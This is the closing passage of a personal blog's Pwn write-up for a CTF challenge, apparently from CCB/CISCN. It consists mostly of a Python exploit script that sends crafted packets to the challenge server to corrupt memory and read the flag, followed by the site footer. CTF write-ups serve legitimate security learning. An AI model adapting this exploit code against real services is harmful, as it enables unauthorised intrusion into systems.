+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;39.106.139.233&#34;</span><span class=p>,</span> <span class=mi>34835</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pack</span><span class=p>(</span><span class=n>func</span><span class=p>,</span> <span class=n>para1</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=n>func</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=n>para1</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00\x00\x00\x01\x07\x00\x00</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>+=</span> <span class=n>content</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>buf</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>push</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x2222</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p1</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pop</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x2222</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>enqueue</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x4444</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>p1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>r</span>
+</span></span><span class=line><span class=cl>    <span class=c1># r = conn()</span>
+</span></span><span class=line><span class=cl>    <span class=c1># pause()</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=c1># s1.connect((&#34;127.0.0.1&#34;, 9999))</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;39.106.139.233&#34;</span><span class=p>,</span> <span class=mi>34835</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span> <span class=o>//</span> <span class=mi>4</span> <span class=o>-</span> <span class=mi>3</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>pop</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>push</span><span class=p>((</span><span class=mh>0xCC</span> <span class=o>-</span> <span class=mh>0x60</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>enqueue</span><span class=p>(</span><span class=mh>0x40</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>((</span><span class=mh>0xC8</span> <span class=o>-</span> <span class=mh>0x90</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>push</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>push</span><span class=p>((</span><span class=mh>0xE0</span> <span class=o>-</span> <span class=mh>0xA0</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>push</span><span class=p>(</span><span class=mh>0x67616C66</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>push</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;p&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;e&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;u&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;o&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;I&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;f&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;n&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;S&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x3333</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;m&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x1111</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x4B</span> <span class=o>-</span> <span class=mi>9</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;SomeIpfun&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;b&#34;</span> <span class=o>*</span> <span class=mh>0x100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s1</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s1</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x200</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=c1># good luck pwning :)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># r.interactive()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span></code></pre></div><p>得到flag：
+<img loading=lazy src=/ccbciscn-11.png alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://juicymio.github.io/tags/pwn/>Pwn</a></li></ul><nav class=paginav><a class=next href=https://juicymio.github.io/posts/%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91%E5%AF%BC%E8%87%B4%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%B0%83%E7%94%A8disp_str%E4%BA%A7%E7%94%9F%E4%B9%B1%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98%E8%A7%A3%E6%9E%90/><span class=title>Next »</span><br><span>关于某些环境下第二次调用disp_str产生乱码的问题解析</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://juicymio.github.io/>JuicyMio's Blog</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
